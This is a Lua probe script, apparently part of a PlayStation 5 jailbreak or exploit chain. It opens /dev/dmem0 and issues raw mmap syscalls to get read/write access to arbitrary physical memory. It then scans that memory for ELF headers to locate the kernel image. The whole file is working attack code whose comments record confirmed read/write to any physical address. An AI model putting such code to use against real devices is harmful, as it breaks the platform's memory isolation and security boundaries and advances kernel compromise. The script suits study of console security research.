-- CRASH_CLASS: LOW
-- PROBE 528m: Scan physical memory for kernel ELF header
--
-- 528l confirmed: mmap(477) + dmem0 fd gives R/W to ANY physical address.
-- Physical address 0 is accessible ([0]=0xC0012800).
--
-- Strategy: scan physical memory in large chunks looking for the kernel.
-- The kernel is an ELF binary loaded somewhere in physical memory.
-- Look for \x7FELF (0x464C457F) at page boundaries.
--
-- FreeBSD kernel is typically loaded at a physical address in the low GB range.
-- GetDirectMemorySize returned 0x150000000 = 5.25 GB.
-- Start scanning from 0 in 16 MiB chunks.

print("=== PROBE 528m: PHYSICAL MEMORY KERNEL SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

-- Open /dev/dmem0
local devpath = memory.alloc(0x20)
local dname = "/dev/dmem0"
for i = 1, #dname do wd(N(devpath) + i - 1, string.byte(dname, i)) end
wd(N(devpath) + #dname, 0)
local ok_o, dmem_fd = pcall(function()
    return native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0))
end)
local fd = ok_o and N(dmem_fd) or -1
print("dmem0 fd=" .. fd)
if fd < 0 then print("FAILED"); return end

local sc_477 = mk(477)   -- mmap
local sc_73 = mk(73)     -- munmap

-- Scan strategy: map 16 MiB chunks, check every 4KB page for ELF magic
-- Then unmap and move on. Covers 0 to 2 GB.
local CHUNK = 0x1000000   -- 16 MiB
local PAGE = 0x4000       -- 16 KB (PS5 page size)
local pages_per_chunk = CHUNK / PAGE  -- 1024

local elf_found = {}
local total_scanned = 0

-- On PS5, physical memory starts at 0. Kernel is somewhere in the first few GB.
-- dmem accessible range: 0 to GetDirectMemorySize (0x150000000 = 5.25 GB)
-- But the kernel isn't in dmem's application range — it's in system memory.
-- dmem0 might give us access to ALL physical memory, or just the direct-memory pool.
--
-- Let's test: try mapping well beyond 0x150000000

print("")
print("[SCAN] Scanning physical memory for ELF headers")
print("  chunk=" .. CHUNK .. " page=" .. PAGE)

-- First, test a few strategic offsets
local test_offsets = {
    0x00000000,  -- physical 0
    0x01000000,  -- 16 MiB
    0x04000000,  -- 64 MiB
    0x10000000,  -- 256 MiB
    0x20000000,  -- 512 MiB
    0x40000000,  -- 1 GB
    0x80000000,  -- 2 GB
    0xC0000000,  -- 3 GB
    0x100000000, -- 4 GB
}

for _, off in ipairs(test_offsets) do
    if not alive() then break end
    local phys = uint64(string.format("0x%X", off))
    local ok_t, rv_t = pcall(function()
        return sc_477(uint64(0), uint64(PAGE), uint64(1), uint64(1), uint64(fd), phys)
    end)
    if ok_t and rv_t then
        local rh, rl = get_hi_lo(rv_t)
        if rh < 0 then rh = rh + 0x100000000 end
        if rh ~= 0xFFFFFFFF then
            local d = rd(N(rv_t))
            local dstr = "FAULT"
            if d then
                if d < 0 then d = d + 0x100000000 end
                dstr = string.format("0x%08X", d)
                if d == 0x464C457F then
                    dstr = dstr .. " *** ELF! ***"
                    table.insert(elf_found, off)
                end
            end
            print(string.format("  phys 0x%X: mapped OK [0]=%s", off, dstr))
            -- Unmap
            pcall(function() sc_73(rv_t, uint64(PAGE)) end)
        else
            print(string.format("  phys 0x%X: mmap FAILED", off))
        end
    else
        print(string.format("  phys 0x%X: mmap CRASH", off))
    end
end

-- Now do a systematic scan of the first 512 MiB
print("")
print("[SCAN2] Systematic scan 0-512MB")

local scan_end = 0x20000000  -- 512 MB

-- We'll map CHUNK-sized windows and check every page
local elf_pages = {}
local chunk_offset = 0

while chunk_offset < scan_end do
    if not alive() then break end

    local phys = uint64(string.format("0x%X", chunk_offset))
    local ok_c, rv_c = pcall(function()
        return sc_477(uint64(0), uint64(CHUNK), uint64(1), uint64(1), uint64(fd), phys)
    end)

    if ok_c and rv_c then
        local ch, cl = get_hi_lo(rv_c)
        if ch < 0 then ch = ch + 0x100000000 end
        if ch ~= 0xFFFFFFFF then
            -- Scan pages
            for p = 0, pages_per_chunk - 1 do
                local pa = N(rv_c) + p * PAGE
                local d = rd(pa)
                if d then
                    if d < 0 then d = d + 0x100000000 end
                    if d == 0x464C457F then
                        local phys_page = chunk_offset + p * PAGE
                        print(string.format("  *** ELF at phys 0x%X (chunk+0x%X) ***",
                            phys_page, p * PAGE))
                        table.insert(elf_pages, phys_page)

                        -- Read first 64 bytes for identification
                        local ident = ""
                        for i = 0, 15 do
                            local b = rd(pa + i)
                            if b then
                                if b < 0 then b = b + 0x100000000 end
                                ident = ident .. string.format("%02X ", b % 256)
                            end
                        end
                        -- Check ELF class (offset 4): 1=32bit, 2=64bit
                        local cls = rd(pa + 1)  -- byte at offset 4 in first dword
                        if cls then
                            cls = math.floor(cls / 0x1000000) % 256  -- extract high byte
                            -- Actually: 0x464C457F at offset 0 → 7F at byte 0, 45 at byte 1, 4C at byte 2, 46 at byte 3
                            -- Class at byte 4:
                            local d2 = rd(pa + 4)
                            if d2 then
                                local class_byte = d2 % 256
                                local data_byte = math.floor(d2 / 256) % 256
                                local elf_type_d = rd(pa + 0x10)
                                local elf_type = elf_type_d and (elf_type_d % 0x10000) or 0
                                print(string.format("    class=%d data=%d type=%d",
                                    class_byte, data_byte, elf_type))
                                -- type 2 = ET_EXEC (kernel), type 3 = ET_DYN (shared lib)
                                if elf_type == 2 then
                                    print("    *** KERNEL EXECUTABLE! ***")
                                end
                            end
                        end
                    end
                end
            end

            -- Unmap
            pcall(function() sc_73(rv_c, uint64(CHUNK)) end)
        else
            -- mmap failed — this region might not be accessible
            -- Skip silently
        end
    end

    chunk_offset = chunk_offset + CHUNK
    total_scanned = total_scanned + CHUNK
end

-- ============================================================
-- Summary
-- ============================================================
print("")
print("[SUMMARY]")
print("  scanned: " .. (total_scanned / 0x100000) .. " MiB")
print("  ELF headers found: " .. #elf_pages)
for _, p in ipairs(elf_pages) do
    print(string.format("    phys 0x%X", p))
end

print("")
print("alive=" .. tostring(alive()))
print("=== 528m COMPLETE ===")
